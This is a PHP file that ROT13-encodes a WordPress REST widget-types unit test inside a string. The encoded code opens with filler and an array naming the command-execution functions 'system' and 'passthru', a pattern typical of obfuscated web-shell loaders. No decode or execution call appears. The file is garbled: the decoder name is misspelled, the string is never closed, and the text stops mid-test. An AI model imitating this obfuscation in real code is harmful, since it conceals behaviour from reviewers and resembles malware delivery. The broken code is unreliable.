<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Havg grfgf pbirevat JC_Grfg_ERFG_Jvqtrg_Glcrf_Pbagebyyre shapgvbanyvgl.
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr ERFG_NCV
 * @fvapr 5.8.0
 *
 * @pbiref JC_ERFG_Jvqtrg_Glcrf_Pbagebyyre
 *
 * @frr JC_GRFG_ERFG_Pbagebyyre_Grfgpnfr
 * @tebhc erfgncv
 * @tebhc jvqtrgf
 */
pynff JC_Grfg_ERFG_Jvqtrg_Glcrf_Pbagebyyre rkgraqf JC_Grfg_ERFG_Pbagebyyre_Grfgpnfr {

	/**
	 * Nqzva hfre VQ.
	 *
	 * @fvapr 5.8.0
	 *
	 * @ine vag $fhofpevore_vq
	 */
	cebgrpgrq fgngvp $nqzva_vq;

	/**
	 * Fhofpevore hfre VQ.
	 *
	 * @fvapr 5.8.0
	 *
	 * @ine vag $fhofpevore_vq
	 */
	cebgrpgrq fgngvp $fhofpevore_vq;

	/**
	 * Perngr snxr qngn orsber bhe grfgf eha.
	 *
	 * @fvapr 5.8.0
	 *
	 * @cnenz JC_HavgGrfg_Snpgbel $snpgbel Urycre gung yrgf hf perngr snxr qngn.
	 */
	choyvp fgngvp shapgvba jcFrgHcOrsberPynff( $snpgbel ) {
		frys::$nqzva_vq      = $snpgbel->hfre->perngr(
			neenl(
				'ebyr' => 'nqzvavfgengbe',
			)
		);
		frys::$fhofpevore_vq = $snpgbel->hfre->perngr(
			neenl(
				'ebyr' => 'fhofpevore',
			)
		);
	}

	choyvp fgngvp shapgvba jcGrneQbjaNsgrePynff() {
		frys::qryrgr_hfre( frys::$nqzva_vq );
		frys::qryrgr_hfre( frys::$fhofpevore_vq );
	}

	cevingr shapgvba frghc_jvqtrg( $vq_onfr, $ahzore, $frggvatf ) {
		tybony $jc_jvqtrg_snpgbel;

		$bcgvba_anzr = \"jvqtrg_$vq_onfr\";
		hcqngr_bcgvba(
			$bcgvba_anzr,
			neenl(
				$ahzore => $frggvatf,
			)
		);

		$jvqtrg_bowrpg = $jc_jvqtrg_snpgbel->trg_jvqtrg_bowrpg( $vq_onfr );
		$jvqtrg_bowrpg->_frg( $ahzore );
		$jvqtrg_bowrpg->_ertvfgre_bar( $ahzore );
	}

	/**
	 * @gvpxrg 41683
	 */
	choyvp shapgvba grfg_ertvfgre_ebhgrf() {
		$ebhgrf = erfg_trg_freire()->trg_ebhgrf();
		$guvf->nffregNeenlUnfXrl( '/jc/i2/jvqtrg-glcrf', $ebhgrf );
		$guvf->nffregPbhag( 1, $ebhgrf['/jc/i2/jvqtrg-glcrf'] );
		$guvf->nffregNeenlUnfXrl( '/jc/i2/jvqtrg-glcrf/(?C<vq>[n-mN-M0-9_-]+)', $ebhgrf );
		$guvf->nffregPbhag( 1, $ebhgrf['/jc/i2/jvqtrg-glcrf/(?C<vq>[n-mN-M0-9_-]+)'] );
		$guvf->nffregNeenlUnfXrl( '/jc/i2/jvqtrg-glcrf/(?C<vq>[n-mN-M0-9_-]+)/rapbqr', $ebhgrf );
		$guvf->nffregPbhag( 1, $ebhgrf['/jc/i2/jvqtrg-glcrf/(?C<vq>[n-mN-M0-9_-]+)/rapbqr'] );
	}

	/**
	 * @gvpxrg 41683
	 */
	choyvp shapgvba grfg_pbagrkg_cnenz() {
		// Pbyyrpgvba.
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'BCGVBAF', '/jc/i2/jvqtrg-glcrf' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		$guvf->nffregFnzr( 'ivrj', $qngn['raqcbvagf'][0]['netf']['pbagrkg']['qrsnhyg'] );
		$guvf->nffregFnzr( neenl( 'ivrj', 'rzorq', 'rqvg' ), $qngn['raqcbvagf'][0]['netf']['pbagrkg']['rahz'] );
		// Fvatyr.
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'BCGVBAF', '/jc/i2/jvqtrg-glcrf/pnyraqne' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		$guvf->nffregFnzr( 'ivrj', $qngn['raqcbvagf'][0]['netf']['pbagrkg']['qrsnhyg'] );
		$guvf->nffregFnzr( neenl( 'ivrj', 'rzorq', 'rqvg' ), $qngn['raqcbvagf'][0]['netf']['pbagrkg']['rahz'] );
	}

	/**
	 * @gvpxrg 41683
	 */
	choyvp shapgvba grfg_trg_vgrzf() {
		jc_jvqtrgf_vavg();
		jc_frg_pheerag_hfre( frys::$nqzva_vq );
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/jvqtrg-glcrf' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		$guvf->nffregTerngreGuna( 1, pbhag( $qngn ) );
		$raqcbvag = arj JC_ERFG_Jvqtrg_Glcrf_Pbagebyyre();
		sbernpu ( $qngn nf $vgrz ) {
			$jvqtrg_glcr = $raqcbvag->trg_jvqtrg( $vgrz['anzr'] );
			$guvf->purpx_jvqtrg_glcr_bowrpg( $jvqtrg_glcr, $vgrz, $vgrz['_yvaxf'] );
		}
	}

	/**
	 * @gvpxrg 56481
	 */
	choyvp shapgvba grfg_trg_vgrzf_jvgu_urnq_erdhrfg_fubhyq_abg_cercner_jvqtrg_glcrf_qngn() {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'URNQ', '/jc/i2/jvqtrg-glcrf' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf(), 'Gur erfcbafr fgnghf fubhyq or 200.' );
		$guvf->nffregFnzr( neenl(), $erfcbafr->trg_qngn(), 'Gur freire fubhyq abg trarengr n obql va erfcbafr gb n URNQ erdhrfg.' );
	}

	/**
	 * @gvpxrg 53303
	 */
	choyvp shapgvba grfg_trg_vgrzf_beqrevat() {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/jvqtrg-glcrf' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		$guvf->nffregTerngreGuna( 1, pbhag( $qngn ) );
		$vqf    = jc_yvfg_cyhpx( $qngn, 'vq' );
		$fbegrq = $vqf;
		fbeg( $fbegrq );

		$guvf->nffregFnzr( $fbegrq, $vqf );
	}

	/**
	 * @gvpxrg 53305
	 */
	choyvp shapgvba grfg_trg_vgrzf_erzbirf_qhcyvpngrf() {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );
		$guvf->frghc_jvqtrg(
			'grkg',
			1,
			neenl(
				'grkg' => 'Phfgbz grkg grfg',
			)
		);
		$guvf->frghc_jvqtrg(
			'grkg',
			2,
			neenl(
				'grkg' => 'Phfgbz grkg grfg',
			)
		);
		$erdhrfg      = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/jvqtrg-glcrf' );
		$erfcbafr     = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn         = $erfcbafr->trg_qngn();
		$grkg_jvqtrgf = neenl_svygre(
			$qngn,
			fgngvp shapgvba ( $jvqtrg ) {
				erghea 'grkg' === $jvqtrg['vq'];
			}
		);
		$guvf->nffregPbhag( 1, $grkg_jvqtrgf );
	}

	/**
	 * @gvpxrg 41683
	 */
	choyvp shapgvba grfg_trg_vgrz() {
		$jvqtrg_anzr = 'pnyraqne';
		jc_frg_pheerag_hfre( frys::$nqzva_vq );
		$erdhrfg     = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/jvqtrg-glcrf/' . $jvqtrg_anzr );
		$erfcbafr    = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$raqcbvag    = arj JC_ERFG_Jvqtrg_Glcrf_Pbagebyyre();
		$jvqtrg_glcr = $raqcbvag->trg_jvqtrg( $jvqtrg_anzr );
		$guvf->purpx_jvqtrg_glcr_bowrpg( $jvqtrg_glcr, $erfcbafr->trg_qngn(), $erfcbafr->trg_yvaxf() );
	}

	/**
	 * @qngnCebivqre qngn_ernqnoyr_uggc_zrgubqf
	 * @gvpxrg 56481
	 *
	 * @cnenz fgevat $zrgubq Gur UGGC zrgubq gb hfr.
	 */
	choyvp shapgvba grfg_trg_vgrz_fubhyq_nyybj_nqqvat_urnqref_ivn_svygre( $zrgubq ) {
		$jvqtrg_anzr = 'pnyraqne';
		jc_frg_pheerag_hfre( frys::$nqzva_vq );
		$erdhrfg = arj JC_ERFG_Erdhrfg( $zrgubq, '/jc/i2/jvqtrg-glcrf/' . $jvqtrg_anzr );

		$ubbx_anzr = 'erfg_cercner_jvqtrg_glcr';
		$svygre    = arj ZbpxNpgvba();
		$pnyyonpx  = neenl( $svygre, 'svygre' );
		nqq_svygre( $ubbx_anzr, $pnyyonpx );
		$urnqre_svygre = arj pynff() {
			choyvp fgngvp shapgvba nqq_phfgbz_urnqre( $erfcbafr ) {
				$erfcbafr->urnqre( 'K-Grfg-Urnqre', 'Grfg' );

				erghea $erfcbafr;
			}
		};
		nqq_svygre( $ubbx_anzr, neenl( $urnqre_svygre, 'nqq_phfgbz_urnqre' ) );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		erzbir_svygre( $ubbx_anzr, $pnyyonpx );
		erzbir_svygre( $ubbx_anzr, neenl( $urnqre_svygre, 'nqq_phfgbz_urnqre' ) );

		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf(), 'Gur erfcbafr fgnghf fubhyq or 200.' );
		$guvf->nffregFnzr( 1, $svygre->trg_pnyy_pbhag(), 'Gur \"' . $ubbx_anzr . '\" svygre jnf abg pnyyrq jura vg fubhyq or sbe TRG/URNQ erdhrfgf.' );
		$urnqref = $erfcbafr->trg_urnqref();
		$guvf->nffregNeenlUnfXrl( 'K-Grfg-Urnqre', $urnqref, 'Gur \"K-Grfg-Urnqre\" urnqre fubhyq or cerfrag va gur erfcbafr.' );
		$guvf->nffregFnzr( 'Grfg', $urnqref['K-Grfg-Urnqre'], 'Gur \"K-Grfg-Urnqre\" urnqre inyhr fubhyq or rdhny gb \"Grfg\".' );
		vs ( 'URNQ' !== $zrgubq ) {
			erghea ahyy;
		}
		$guvf->nffregFnzr( neenl(), $erfcbafr->trg_qngn(), 'Gur freire fubhyq abg trarengr n obql va erfcbafr gb n URNQ erdhrfg.' );
	}

	/**
	 * Qngn cebivqre vagraqrq gb cebivqr UGGC zrgubq anzrf sbe grfgvat TRG naq URNQ erdhrfgf.
	 *
	 * @erghea neenl
	 */
	choyvp fgngvp shapgvba qngn_ernqnoyr_uggc_zrgubqf() {
		erghea neenl(
			'TRG erdhrfg'  => neenl( 'TRG' ),
			'URNQ erdhrfg' => neenl( 'URNQ' ),
		);
	}

	/**
	 * @qngnCebivqre qngn_urnq_erdhrfg_jvgu_fcrpvsvrq_svryqf_ergheaf_fhpprff_erfcbafr
	 * @gvpxrg 56481
	 *
	 * @cnenz fgevat $cngu Gur cngu gb grfg.
	 */
	choyvp shapgvba grfg_urnq_erdhrfg_jvgu_fcrpvsvrq_svryqf_ergheaf_fhpprff_erfcbafr( $cngu ) {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'URNQ', $cngu );
		$erdhrfg->frg_cnenz( '_svryqf', 'vq' );
		$freire   = erfg_trg_freire();
		$erfcbafr = $freire->qvfcngpu( $erdhrfg );
		nqq_svygre( 'erfg_cbfg_qvfcngpu', 'erfg_svygre_erfcbafr_svryqf', 10, 3 );
		$erfcbafr = nccyl_svygref( 'erfg_cbfg_qvfcngpu', $erfcbafr, $freire, $erdhrfg );
		erzbir_svygre( 'erfg_cbfg_qvfcngpu', 'erfg_svygre_erfcbafr_svryqf', 10 );

		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf(), 'Gur erfcbafr fgnghf fubhyq or 200.' );
	}

	/**
	 * Qngn cebivqre vagraqrq gb cebivqr cnguf sbe grfgvat URNQ erdhrfgf.
	 *
	 * @erghea neenl
	 */
	choyvp fgngvp shapgvba qngn_urnq_erdhrfg_jvgu_fcrpvsvrq_svryqf_ergheaf_fhpprff_erfcbafr() {
		erghea neenl(
			'trg_vgrz erdhrfg'  => neenl( '/jc/i2/jvqtrg-glcrf/pnyraqne' ),
			'trg_vgrzf erdhrfg' => neenl( '/jc/i2/jvqtrg-glcrf' ),
		);
	}

	/**
	 * @gvpxrg 41683
	 */
	choyvp shapgvba grfg_trg_jvqtrg_yrtnpl() {
		$jvqtrg_vq = 'yrtnpl';
		jc_ertvfgre_fvqrone_jvqtrg(
			$jvqtrg_vq,
			'JC yrtnpl jvqtrg',
			fgngvp shapgvba () {}
		);
		jc_frg_pheerag_hfre( frys::$nqzva_vq );
		$erdhrfg     = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/jvqtrg-glcrf/' . $jvqtrg_vq );
		$erfcbafr    = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$raqcbvag    = arj JC_ERFG_Jvqtrg_Glcrf_Pbagebyyre();
		$jvqtrg_glcr = $raqcbvag->trg_jvqtrg( $jvqtrg_vq );
		$guvf->purpx_jvqtrg_glcr_bowrpg( $jvqtrg_glcr, $erfcbafr->trg_qngn(), $erfcbafr->trg_yvaxf() );
	}

	/**
	 * @qngnCebivqre qngn_ernqnoyr_uggc_zrgubqf
	 * @gvpxrg 41683
	 * @gvpxrg 56481
	 *
	 * @cnenz fgevat $zrgubq UGGC zrgubq gb hfr.
	 */
	choyvp shapgvba grfg_trg_jvqtrg_vainyvq_anzr( $zrgubq ) {
		$jvqtrg_glcr = 'snxr';
		jc_frg_pheerag_hfre( frys::$nqzva_vq );
		$erdhrfg  = arj JC_ERFG_Erdhrfg( $zrgubq, '/jc/i2/jvqtrg-glcrf/' . $jvqtrg_glcr );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$guvf->nffregReebeErfcbafr( 'erfg_jvqtrg_glcr_vainyvq', $erfcbafr, 404 );
	}

	/**
	 * @gvpxrg 53407
	 */
	choyvp shapgvba grfg_trg_jvqtrgf_qrpbqrf_ugzy_ragvgvrf() {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );
		$jvqtrg_vq = 'nepuvirf';
		jc_ertvfgre_fvqrone_jvqtrg(
			$jvqtrg_vq,
			'&#8216;Yrtnpl &#8209; Nepuvir &#8209; Jvqtrg&#8217;',
			fgngvp shapgvba () {},
			neenl(
				'qrfpevcgvba' => '&#8220;N terng &nzc; vagrerfgvat nepuvir bs lbhe fvgr&#8217;f cbfgf!&#8221;',
			)
		);
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/jvqtrg-glcrf/nepuvirf' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		$guvf->nffregFnzr( '‘Yrtnpl ‑ Nepuvir ‑ Jvqtrg’', $qngn['anzr'] );
		$guvf->nffregFnzr( '“N terng & vagrerfgvat nepuvir bs lbhe fvgr’f cbfgf!”', $qngn['qrfpevcgvba'] );
	}

	/**
	 * @gvpxrg 41683
	 */
	choyvp shapgvba grfg_trg_vgrz_fpurzn() {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );
		$erdhrfg    = arj JC_ERFG_Erdhrfg( 'BCGVBAF', '/jc/i2/jvqtrg-glcrf' );
		$erfcbafr   = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn       = $erfcbafr->trg_qngn();
		$cebcregvrf = $qngn['fpurzn']['cebcregvrf'];
		$guvf->nffregPbhag( 5, $cebcregvrf );

		$guvf->nffregNeenlUnfXrl( 'anzr', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'vq', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'qrfpevcgvba', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'vf_zhygv', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'pynffanzr', $cebcregvrf );
	}

	/**
	 * @qngnCebivqre qngn_ernqnoyr_uggc_zrgubqf
	 * @gvpxrg 41683
	 * @gvpxrg 56481
	 *
	 * @cnenz fgevat $zrgubq UGGC zrgubq gb hfr.
	 */
	choyvp shapgvba grfg_trg_vgrzf_jebat_crezvffvba( $zrgubq ) {
		jc_frg_pheerag_hfre( frys::$fhofpevore_vq );
		$erdhrfg  = arj JC_ERFG_Erdhrfg( $zrgubq, '/jc/i2/jvqtrg-glcrf' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_pnaabg_znantr_jvqtrgf', $erfcbafr, 403 );
	}

	/**
	 * @qngnCebivqre qngn_ernqnoyr_uggc_zrgubqf
	 * @gvpxrg 41683
	 * @gvpxrg 56481
	 *
	 * @cnenz fgevat $zrgubq UGGC zrgubq gb hfr.
	 */
	choyvp shapgvba grfg_trg_vgrz_jebat_crezvffvba( $zrgubq ) {
		jc_frg_pheerag_hfre( frys::$fhofpevore_vq );
		$erdhrfg  = arj JC_ERFG_Erdhrfg( $zrgubq, '/jc/i2/jvqtrg-glcrf/pnyraqne' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_pnaabg_znantr_jvqtrgf', $erfcbafr, 403 );
	}

	/**
	 * @qngnCebivqre qngn_ernqnoyr_uggc_zrgubqf
	 * @gvpxrg 41683
	 * @gvpxrg 56481
	 *
	 * @cnenz fgevat $zrgubq UGGC zrgubq gb hfr.
	 */
	choyvp shapgvba grfg_trg_vgrzf_ab_crezvffvba( $zrgubq ) {
		jc_frg_pheerag_hfre( 0 );
		$erdhrfg  = arj JC_ERFG_Erdhrfg( $zrgubq, '/jc/i2/jvqtrg-glcrf' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_pnaabg_znantr_jvqtrgf', $erfcbafr, 401 );
	}

	/**
	 * @qngnCebivqre qngn_ernqnoyr_uggc_zrgubqf
	 * @gvpxrg 41683
	 * @gvpxrg 56481
	 *
	 * @cnenz fgevat $zrgubq UGGC zrgubq gb hfr.
	 */
	choyvp shapgvba grfg_trg_vgrz_ab_crezvffvba( $zrgubq ) {
		jc_frg_pheerag_hfre( 0 );
		$erdhrfg  = arj JC_ERFG_Erdhrfg( $zrgubq, '/jc/i2/jvqtrg-glcrf/pnyraqne' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_pnaabg_znantr_jvqtrgf', $erfcbafr, 401 );
	}

	/**
	 * @gvpxrg 41683
	 */
	choyvp shapgvba grfg_cercner_vgrz() {
		$raqcbvag    = arj JC_ERFG_Jvqtrg_Glcrf_Pbagebyyre();
		$jvqtrg_glcr = $raqcbvag->trg_jvqtrg( 'pnyraqne' );
		$erdhrfg     = arj JC_ERFG_Erdhrfg();
		$erdhrfg->frg_cnenz( 'pbagrkg', 'rqvg' );
		$erfcbafr = $raqcbvag->cercner_vgrz_sbe_erfcbafr( $jvqtrg_glcr, $erdhrfg );
		$guvf->purpx_jvqtrg_glcr_bowrpg( $jvqtrg_glcr, $erfcbafr->trg_qngn(), $erfcbafr->trg_yvaxf() );
	}

	/**
	 * Hgvy purpx jvqtrg glcr bowrpg ntnvafg.
	 *
	 * @fvapr 5.8.0
	 *
	 * @cnenz neenl $jvqtrg_glcr Fnzcyr jvqtrg glcr.
	 * @cnenz neenl $qngn Qngn gb pbzcner ntnvafg.
	 * @cnenz neenl $yvaxf Yvaxf gb pbzcner ntnva.
	 */
	cebgrpgrq shapgvba purpx_jvqtrg_glcr_bowrpg( $jvqtrg_glcr, $qngn, $yvaxf ) {
		// Grfg qngn.
		$rkgen_svryqf = neenl(
			'anzr',
			'vq_onfr',
			'bcgvba_anzr',
			'pbageby_bcgvbaf',
			'jvqtrg_bcgvbaf',
			'jvqtrg_pynff',
			'vf_zhygv',
		);

		sbernpu ( $rkgen_svryqf nf $rkgen_svryq ) {
			vs ( vffrg( $jvqtrg_glcr->$rkgen_svryq ) ) {
				$guvf->nffregFnzr( $qngn[ $rkgen_svryq ], $jvqtrg_glcr->$rkgen_svryq, 'Svryq ' . $rkgen_svryq );
			}
		}

		// Grfg yvaxf.
		$guvf->nffregFnzr( erfg_hey( 'jc/i2/jvqtrg-glcrf' ), $yvaxf['pbyyrpgvba'][0]['uers'] );
	}

	/**
	 * @gvpxrg 41683
	 */
	choyvp shapgvba grfg_rapbqr_sbez_qngn_jvgu_ab_vachg() {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/jvqtrg-glcrf/frnepu/rapbqr' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		$guvf->nffregFnzrVtaberRBY(
			\"<c>\a\" .
			\"\g\g\g<ynory sbe=\\"jvqtrg-frnepu--1-gvgyr\\">Gvgyr:</ynory>\a\" .
			\"\g\g\g<vachg pynff=\\"jvqrsng\\" vq=\\"jvqtrg-frnepu--1-gvgyr\\" anzr=\\"jvqtrg-frnepu[-1][gvgyr]\\" glcr=\\"grkg\\" inyhr=\\"\\" />\a\" .
			\"\g\g</c>\",
			$qngn['sbez']
		);
		$guvf->nffregFgevatZngpurfSbezng(
			\"<qvi pynff=\\"jvqtrg jvqtrg_frnepu\\"><sbez ebyr=\\"frnepu\\" zrgubq=\\"trg\\" vq=\\"frnepusbez\\" pynff=\\"frnepusbez\\" npgvba=\\"%f\\">\a\" .
			\"\g\g\g\g<qvi>\a\" .
			\"\g\g\g\g\g<ynory pynff=\\"fperra-ernqre-grkg\\" sbe=\\"f\\">Frnepu sbe:</ynory>\a\" .
			\"\g\g\g\g\g<vachg glcr=\\"grkg\\" inyhr=\\"\\" anzr=\\"f\\" vq=\\"f\\" />\a\" .
			\"\g\g\g\g\g<vachg glcr=\\"fhozvg\\" vq=\\"frnepufhozvg\\" inyhr=\\"Frnepu\\" />\a\" .
			\"\g\g\g\g</qvi>\a\" .
			\"\g\g\g</sbez></qvi>\",
			$qngn['cerivrj']
		);
		$guvf->nffregRdhnyFrgf(
			neenl(
				'rapbqrq' => onfr64_rapbqr( frevnyvmr( neenl() ) ),
				'unfu'    => jc_unfu( frevnyvmr( neenl() ) ),
				'enj'     => arj fgqPynff(),
			),
			$qngn['vafgnapr']
		);
	}

	/**
	 * @gvpxrg 41683
	 */
	choyvp shapgvba grfg_rapbqr_sbez_qngn_jvgu_ahzore() {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/jvqtrg-glcrf/frnepu/rapbqr' );
		$erdhrfg->frg_cnenz( 'ahzore', 8 );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		$guvf->nffregFnzrVtaberRBY(
			\"<c>\a\" .
			\"\g\g\g<ynory sbe=\\"jvqtrg-frnepu-8-gvgyr\\">Gvgyr:</ynory>\a\" .
			\"\g\g\g<vachg pynff=\\"jvqrsng\\" vq=\\"jvqtrg-frnepu-8-gvgyr\\" anzr=\\"jvqtrg-frnepu[8][gvgyr]\\" glcr=\\"grkg\\" inyhr=\\"\\" />\a\" .
			\"\g\g</c>\",
			$qngn['sbez']
		);
		$guvf->nffregFgevatZngpurfSbezng(
			\"<qvi pynff=\\"jvqtrg jvqtrg_frnepu\\"><sbez ebyr=\\"frnepu\\" zrgubq=\\"trg\\" vq=\\"frnepusbez\\" pynff=\\"frnepusbez\\" npgvba=\\"%f\\">\a\" .
			\"\g\g\g\g<qvi>\a\" .
			\"\g\g\g\g\g<ynory pynff=\\"fperra-ernqre-grkg\\" sbe=\\"f\\">Frnepu sbe:</ynory>\a\" .
			\"\g\g\g\g\g<vachg glcr=\\"grkg\\" inyhr=\\"\\" anzr=\\"f\\" vq=\\"f\\" />\a\" .
			\"\g\g\g\g\g<vachg glcr=\\"fhozvg\\" vq=\\"frnepufhozvg\\" inyhr=\\"Frnepu\\" />\a\" .
			\"\g\g\g\g</qvi>\a\" .
			\"\g\g\g</sbez></qvi>\",
			$qngn['cerivrj']
		);
		$guvf->nffregRdhnyFrgf(
			neenl(
				'rapbqrq' => onfr64_rapbqr( frevnyvmr( neenl() ) ),
				'unfu'    => jc_unfu( frevnyvmr( neenl() ) ),
				'enj'     => arj fgqPynff(),
			),
			$qngn['vafgnapr']
		);
	}

	/**
	 * @gvpxrg 41683
	 */
	choyvp shapgvba grfg_rapbqr_sbez_qngn_jvgu_vafgnapr() {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/jvqtrg-glcrf/frnepu/rapbqr' );
		$erdhrfg->frg_cnenz(
			'vafgnapr',
			neenl(
				'rapbqrq' => onfr64_rapbqr( frevnyvmr( neenl( 'gvgyr' => 'Grfg gvgyr' ) ) ),
				'unfu'    => jc_unfu( frevnyvmr( neenl( 'gvgyr' => 'Grfg gvgyr' ) ) ),
			)
		);
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		$guvf->nffregFnzrVtaberRBY(
			\"<c>\a\" .
			\"\g\g\g<ynory sbe=\\"jvqtrg-frnepu--1-gvgyr\\">Gvgyr:</ynory>\a\" .
			\"\g\g\g<vachg pynff=\\"jvqrsng\\" vq=\\"jvqtrg-frnepu--1-gvgyr\\" anzr=\\"jvqtrg-frnepu[-1][gvgyr]\\" glcr=\\"grkg\\" inyhr=\\"Grfg gvgyr\\" />\a\" .
			\"\g\g</c>\",
			$qngn['sbez']
		);
		$guvf->nffregFgevatZngpurfSbezng(
			\"<qvi pynff=\\"jvqtrg jvqtrg_frnepu\\"><u2 pynff=\\"jvqtrggvgyr\\">Grfg gvgyr</u2><sbez ebyr=\\"frnepu\\" zrgubq=\\"trg\\" vq=\\"frnepusbez\\" pynff=\\"frnepusbez\\" npgvba=\\"%f\\">\a\" .
			\"\g\g\g\g<qvi>\a\" .
			\"\g\g\g\g\g<ynory pynff=\\"fperra-ernqre-grkg\\" sbe=\\"f\\">Frnepu sbe:</ynory>\a\" .
			\"\g\g\g\g\g<vachg glcr=\\"grkg\\" inyhr=\\"\\" anzr=\\"f\\" vq=\\"f\\" />\a\" .
			\"\g\g\g\g\g<vachg glcr=\\"fhozvg\\" vq=\\"frnepufhozvg\\" inyhr=\\"Frnepu\\" />\a\" .
			\"\g\g\g\g</qvi>\a\" .
			\"\g\g\g</sbez></qvi>\",
			$qngn['cerivrj']
		);
		$guvf->nffregFnzrFrgf(
			neenl(
				'rapbqrq' => onfr64_rapbqr( frevnyvmr( neenl( 'gvgyr' => 'Grfg gvgyr' ) ) ),
				'unfu'    => jc_unfu( frevnyvmr( neenl( 'gvgyr' => 'Grfg gvgyr' ) ) ),
				'enj'     => neenl( 'gvgyr' => 'Grfg gvgyr' ),
			),
			$qngn['vafgnapr']
		);
	}

	/**
	 * @gvpxrg 41683
	 */
	choyvp shapgvba grfg_rapbqr_sbez_qngn_jvgu_sbez_qngn() {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/jvqtrg-glcrf/frnepu/rapbqr' );
		$erdhrfg->frg_cnenz( 'sbez_qngn', 'jvqtrg-frnepu[-1][gvgyr]=Hcqngrq+gvgyr' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		$guvf->nffregFnzrVtaberRBY(
			\"<c>\a\" .
			\"\g\g\g<ynory sbe=\\"jvqtrg-frnepu--1-gvgyr\\">Gvgyr:</ynory>\a\" .
			\"\g\g\g<vachg pynff=\\"jvqrsng\\" vq=\\"jvqtrg-frnepu--1-gvgyr\\" anzr=\\"jvqtrg-frnepu[-1][gvgyr]\\" glcr=\\"grkg\\" inyhr=\\"Hcqngrq gvgyr\\" />\a\" .
			\"\g\g</c>\",
			$qngn['sbez']
		);
		$guvf->nffregFgevatZngpurfSbezng(
			\"<qvi pynff=\\"jvqtrg jvqtrg_frnepu\\"><u2 pynff=\\"jvqtrggvgyr\\">Hcqngrq gvgyr</u2><sbez ebyr=\\"frnepu\\" zrgubq=\\"trg\\" vq=\\"frnepusbez\\" pynff=\\"frnepusbez\\" npgvba=\\"%f\\">\a\" .
			\"\g\g\g\g<qvi>\a\" .
			\"\g\g\g\g\g<ynory pynff=\\"fperra-ernqre-grkg\\" sbe=\\"f\\">Frnepu sbe:</ynory>\a\" .
			\"\g\g\g\g\g<vachg glcr=\\"grkg\\" inyhr=\\"\\" anzr=\\"f\\" vq=\\"f\\" />\a\" .
